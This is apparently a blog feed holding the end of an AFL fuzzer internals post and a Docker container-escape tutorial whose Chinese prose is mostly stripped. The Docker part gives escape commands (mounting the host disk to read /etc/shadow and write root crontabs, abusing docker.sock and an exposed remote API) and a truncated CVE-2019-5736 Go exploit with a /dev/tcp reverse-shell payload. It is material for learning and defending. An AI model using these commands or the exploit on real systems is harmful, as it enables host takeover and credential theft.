class="number">0</span>, %rax</span><br><span class="line">  jl   __afl_die</span><br><span class="line">  je   __afl_fork_resume</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* In parent process: write PID to pipe, then wait for child. */</span></span><br><span class="line"></span><br><span class="line">  movl %eax, __afl_fork_pid(%rip)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// st_pipefuzzer pid </span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx                   <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_fork_pid(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi             <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"> <span class="comment">// waitpid</span></span><br><span class="line">  movq $<span class="number">0</span>, %rdx                   <span class="comment">/* no flags  */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi     <span class="comment">/* status    */</span></span><br><span class="line">  movq __afl_fork_pid(%rip), %rdi <span class="comment">/* PID       */</span></span><br><span class="line">call waitpid@PLT</span><br><span class="line">  cmpq $<span class="number">0</span>, %rax</span><br><span class="line">  jle  __afl_die</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Relay wait status to pipe, then loop back. */</span></span><br><span class="line">  <span class="comment">// st_pipefuzzer</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi         <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"></span><br><span class="line">  jmp  __afl_fork_wait_loop</span><br></pre></td></tr></table></figure><p> <code>__afl_fork_resume</code></p><ul><li></li><li>sp</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__afl_fork_resume:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In child process: close fds, resume execution. */</span></span><br><span class="line"></span><br><span class="line">  movq $<span class="number">198</span>, %rdi</span><br><span class="line">call close@PLT</span><br><span class="line"></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi</span><br><span class="line">call close@PLT</span><br><span class="line"></span><br><span class="line">  popq %rdx</span><br><span class="line">  popq %rdx</span><br><span class="line"></span><br><span class="line">  movq %r12, %rsp</span><br><span class="line">  popq %r12</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">0</span>(%rsp), %rax</span><br><span class="line">  movq  <span class="number">8</span>(%rsp), %rcx</span><br><span class="line">  movq <span class="number">16</span>(%rsp), %rdi</span><br><span class="line">  movq <span class="number">32</span>(%rsp), %rsi</span><br><span class="line">  movq <span class="number">40</span>(%rsp), %r8</span><br><span class="line">  movq <span class="number">48</span>(%rsp), %r9</span><br><span class="line">  movq <span class="number">56</span>(%rsp), %r10</span><br><span class="line">  movq <span class="number">64</span>(%rsp), %r11</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">96</span>(%rsp), %xmm0</span><br><span class="line">  movq <span class="number">112</span>(%rsp), %xmm1</span><br><span class="line">  movq <span class="number">128</span>(%rsp), %xmm2</span><br><span class="line">  movq <span class="number">144</span>(%rsp), %xmm3</span><br><span class="line">  movq <span class="number">160</span>(%rsp), %xmm4</span><br><span class="line">  movq <span class="number">176</span>(%rsp), %xmm5</span><br><span class="line">  movq <span class="number">192</span>(%rsp), %xmm6</span><br><span class="line">  movq <span class="number">208</span>(%rsp), %xmm7</span><br><span class="line">  movq <span class="number">224</span>(%rsp), %xmm8</span><br><span class="line">  movq <span class="number">240</span>(%rsp), %xmm9</span><br><span class="line">  movq <span class="number">256</span>(%rsp), %xmm10</span><br><span class="line">  movq <span class="number">272</span>(%rsp), %xmm11</span><br><span class="line">  movq <span class="number">288</span>(%rsp), %xmm12</span><br><span class="line">  movq <span class="number">304</span>(%rsp), %xmm13</span><br><span class="line">  movq <span class="number">320</span>(%rsp), %xmm14</span><br><span class="line">  movq <span class="number">336</span>(%rsp), %xmm15</span><br><span class="line"></span><br><span class="line">  leaq <span class="number">352</span>(%rsp), %rsp</span><br><span class="line"></span><br><span class="line">  jmp  __afl_store</span><br></pre></td></tr></table></figure><p>__afl_store  hit count  AFL </p><p>AFL  fork server execve  fuzz </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>AFL64KBtuplebytetuplebytebitAFL</p><p><code>__afl_store</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;        <span class="comment">//, R(MAP_SIZE)</span></span><br><span class="line">shared_mem[cur_location ^ prev_location]++;  <span class="comment">//prev_location, . shared_mem</span></span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;           <span class="comment">//prev_location</span></span><br></pre></td></tr></table></figure><p>cur_location, <code>cur_location ^ prev_location</code>, <code>shared_mem</code>, </p><p><code>shared_mem[]</code>  (caller) 64kb<code>(branch_src, branch_dst)</code>.</p><p>(collisions)2k10k</p><p><code>prev_location = cur_location &gt;&gt; 1</code>, <code>A-&gt;BB-&gt;A</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">prev_location  &gt;&gt; <span class="number">1</span></span><br><span class="line">    A-&gt;B:</span><br><span class="line">        prev_location = A;    <span class="comment">//A</span></span><br><span class="line">        cur_location = B;</span><br><span class="line">        shared_mem[A^B]++;</span><br><span class="line">    B-&gt;A:</span><br><span class="line">        prev_location = B;    <span class="comment">//B</span></span><br><span class="line">        cur_location = A;</span><br><span class="line">        shared_mem[B^A]++;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://xidoo.top/2022/01/afl-white-book/">AFL </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker-escape</title>
      <link href="/2024/03/06/Docker-escape/"/>
      <url>/2024/03/06/Docker-escape/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><p>OCIOpen Container Initiative Docker  Kubernetes</p><p> OCI OCI <code>Image spec</code><code>Runtime spec</code></p><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>Docker <a href="https://www.runoob.com/go/go-tutorial.html">Go </a> Apache2.0 </p><p>DockerLinuxcgroupNamespacedockerUnion FS</p><h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p></p><p>Linux namespace <code>A</code>pid1<code>B</code>pid1</p><p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/nsproxy.h#L31">nsproxy.h</a>7namespace <code>task_struct</code> nsproxy </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A structure to contain pointers to all per-process</span></span><br><span class="line"><span class="comment"> * namespaces - fs (mount), uts, network, sysvipc, etc.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The pid namespace is an exception -- it&#x27;s accessed using</span></span><br><span class="line"><span class="comment"> * task_active_pid_ns.  The pid namespace here is the</span></span><br><span class="line"><span class="comment"> * namespace that children will use.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &#x27;count&#x27; is the number of tasks holding a reference.</span></span><br><span class="line"><span class="comment"> * The count for each namespace, then, will be the number</span></span><br><span class="line"><span class="comment"> * of nsproxies pointing to it, not the number of tasks.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The nsproxy is shared by tasks which share all namespaces.</span></span><br><span class="line"><span class="comment"> * As soon as a single namespace is cloned or unshared, the</span></span><br><span class="line"><span class="comment"> * nsproxy is copied.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">nsproxy</span> &#123;</span><br><span class="line"><span class="type">refcount_t</span> count;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">uts_namespace</span> *uts_ns;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ipc_namespace</span> *ipc_ns;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mnt_namespace</span> *mnt_ns;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pid_namespace</span> *pid_ns_for_children;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">net</span>      *net_ns;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">time_namespace</span> *time_ns;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">time_namespace</span> *time_ns_for_children;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cgroup_namespace</span> *cgroup_ns;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>namespacelinuxnamespace</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">ls</span> -al /proc/self/ns</span><br><span class="line">total 0</span><br><span class="line">dr-x--x--x 2 ubuntu ubuntu 0 Mar  6 09:28 .</span><br><span class="line">dr-xr-xr-x 9 ubuntu ubuntu 0 Mar  6 09:28 ..</span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 cgroup -&gt; <span class="string">&#x27;cgroup:[4026531835]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 ipc -&gt; <span class="string">&#x27;ipc:[4026531839]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 mnt -&gt; <span class="string">&#x27;mnt:[4026531841]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 net -&gt; <span class="string">&#x27;net:[4026531840]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 pid -&gt; <span class="string">&#x27;pid:[4026531836]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 pid_for_children -&gt; <span class="string">&#x27;pid:[4026531836]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 time -&gt; <span class="string">&#x27;time:[4026531834]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 time_for_children -&gt; <span class="string">&#x27;time:[4026531834]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 user -&gt; <span class="string">&#x27;user:[4026531837]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 uts -&gt; <span class="string">&#x27;uts:[4026531838]&#x27;</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unshare</span></span><br><span class="line">$ man 2 unshare</span><br><span class="line">$ man <span class="built_in">clone</span></span><br></pre></td></tr></table></figure><p>unshare</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:/ <span class="comment"># readlink /proc/$$/ns/uts </span></span><br><span class="line">uts:[4026531838]</span><br><span class="line">:/ <span class="comment"># unshare --uts /bin/bash</span></span><br><span class="line">:/ <span class="comment"># readlink /proc/$$/ns/uts </span></span><br><span class="line">uts:[4026532690]</span><br></pre></td></tr></table></figure><h3 id="cgroup"><a href="#cgroup" class="headerlink" title="cgroup"></a>cgroup</h3><p></p><p>cgroupcontrol grouplinuxCPUmemorydisk I&#x2F;Onetwork</p><p>cgroup</p><ol><li>Resource limitsCPUdisknetwork</li><li>Prioritizationcgroupcgroup</li><li>Accounting&#x2F;</li><li>Controlfreezer</li></ol><p>cgroupcontainers</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/self/cgroup</span><br><span class="line">0::/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-4f943e0d-c769-40ec-92df-ca2643d86752.scope</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -al /sys/fs/cgroup<span class="comment"># cgroupcgroupcgroup</span></span><br></pre></td></tr></table></figure><h3 id="Union-FS"><a href="#Union-FS" class="headerlink" title="Union FS"></a>Union FS</h3><p>Union File System  UnionFS<strong></strong><strong></strong></p><p></p><p></p><p>OverlayFSOverlayfs  ext4fs  xfs <a href="https://zhuanlan.zhihu.com/p/679328995">OverlayFS</a></p><h3 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h3><p>Docker</p><ul><li><a href="https://www.infoq.com/articles/build-a-container-golang/">Build Your Own Container Using Less than 100 Lines of Go</a></li><li><a href="https://www.wolai.com/curry00/rjPry5XyA6BLYyUoEaDWDm">docker</a></li></ul><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><ul><li><code>.dockerenv</code></li><li><code>/proc/1/cgroup</code>docker!</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@06fcbcd12128:/<span class="comment"># ls -al /</span></span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar  6 01:52 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar  6 01:52 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Mar  6 01:52 .dockerenv</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ???</span></span><br><span class="line">root@06fcbcd12128:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">0::/</span><br></pre></td></tr></table></figure><h3 id="Docker-"><a href="#Docker-" class="headerlink" title="Docker "></a>Docker </h3><p></p><ul><li>privileged root  root </li><li>net&#x3D;host</li><li>pid&#x3D;host</li><li>volume &#x2F;:&#x2F;host</li></ul><p><code>docker run --privileged</code>Dockerssh</p><p>CapEff CapEff 0000003fffffffff  0000001fffffffff <a href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">(1)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">bash-4.4<span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000003fffffffff</span><br><span class="line">CapEff: 0000003fffffffff</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">root@a8a2a8be5ee4:/<span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh:0000000000000000</span><br><span class="line">CapPrm:00000000a80425fb</span><br><span class="line">CapEff:00000000a80425fb</span><br><span class="line">CapBnd:00000000a80425fb</span><br><span class="line">CapAmb:0000000000000000</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ capsh --decode=0000003fffffffff</span><br><span class="line">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">fdisk -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">mkdir</span> -p hacker</span><br><span class="line">mount /dev/sda1 /hacker</span><br><span class="line"><span class="built_in">cat</span> /hacker/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">/hacker/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="built_in">chroot</span> /mnt adduser john</span><br></pre></td></tr></table></figure><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><h4 id="docker-sock"><a href="#docker-sock" class="headerlink" title="docker.sock"></a>docker.sock</h4><p>docker.sock**Docker(Docker daemon)<strong></strong>Unix(Unix domain socket)**Docker</p><p>docker.sock</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock <span class="built_in">id</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lah /var/run/docker.sock</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /mount_dir</span><br></pre></td></tr></table></figure><h4 id="procfs"><a href="#procfs" class="headerlink" title="procfs"></a>procfs</h4><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern</span><br></pre></td></tr></table></figure><p><a href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">(2)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">cat</span> /proc/mounts | xargs -d <span class="string">&#x27;,&#x27;</span> -n 1 | grep workdir</span><br><span class="line"></span><br><span class="line"><span class="comment">#  shell  proc </span></span><br></pre></td></tr></table></figure><h3 id="Docker-remote-API"><a href="#Docker-remote-API" class="headerlink" title="Docker remote API"></a>Docker remote API</h3><p>dockersocketdocker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure><p> remote API docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">curl http://&lt;target&gt;:2375/containers/json</span><br><span class="line">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure><h3 id="Docker-"><a href="#Docker-" class="headerlink" title="Docker "></a>Docker </h3><p> <code>docker version</code>  <code>runc &amp;&amp; containerd</code> </p><h4 id="runc"><a href="#runc" class="headerlink" title="runc"></a>runc</h4><p>runcrunC dockerruncexecrunc root</p><p></p><ul><li>fork </li><li></li><li></li></ul><p><code>docker run</code>runC <code>/bin/bash</code> runC</p><p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.cd098a90bebc7feb12058053becebedc?rik=DLvUCkgJJdKuYg&riu=http://xuxinkun.github.io/img/docker-oci-runc-k8s/kubelet.png&ehk=mGer8iOXT1GplC3OjM4e3sLhuBjr74asYNM3BLOwePA=&risl=&pid=ImgRaw&r=0" alt="runc"></p><p>procfs:</p><ul><li><code>/proc/[PID]/exe</code>: </li><li><code>/proc/[PID]/fd/</code>: </li></ul><p><code>/proc/[PID]/exe</code>mntchroot</p><p>CVE-2019-5736runc root</p><ul><li><code>/bin/sh</code><code>#!/proc/self/exe</code><code>/bin/sh</code><code>/proc/self/exe</code></li><li><code>/proc/self/exe</code><strong></strong><code>/bin/sh</code><code>/proc/self/exe</code><code>runc</code></li></ul><p>&#x2F;proc&#x2F;pid&#x2F;exe&#x2F;proc&#x2F;proc&#x2F;pid&#x2F;exepid</p><p>dockerruncexeruncshell</p><p>PoC</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line"><span class="comment">// IP  PORT</span></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp; 1 &amp;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">///bin/shroot</span></span><br><span class="line">fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//#!/proc/self/exe</span></span><br><span class="line">fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">err = fd.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// /procrunc</span></span><br><span class="line"><span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line"><span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">fstring := <span class="type">string</span>(fbytes)</span><br><span class="line"><span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">found, err = strconv.Atoi(f.Name())</span><br><span class="line"><span class="keyword">if</span> err != <span 